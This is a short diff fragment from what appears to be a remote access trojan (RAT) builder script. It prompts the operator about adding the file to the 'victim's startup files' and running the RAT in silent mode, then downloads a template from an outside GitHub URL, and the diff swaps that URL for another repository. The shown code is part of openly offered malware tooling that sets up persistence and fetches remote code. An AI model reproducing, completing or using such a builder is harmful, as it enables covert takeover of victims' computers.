@@ -98,7 +98,7 @@ if choice == 1:
     add_to_startup = input(f"{CYAN}Add file to victim's startup files? (true/false) → {RESET}").strip().title()
     silent_mode = input(f"{CYAN}Should the RAT be silent mode? (no console output) (true/false) → {RESET}").strip().title()
 
-    template = "https://raw.githubusercontent.com/shiro/your-repo/main/template.py"
+    template = "https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/RAT/ignore/template.py"
     source = request.get(template).text
 
     if not (file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw")):
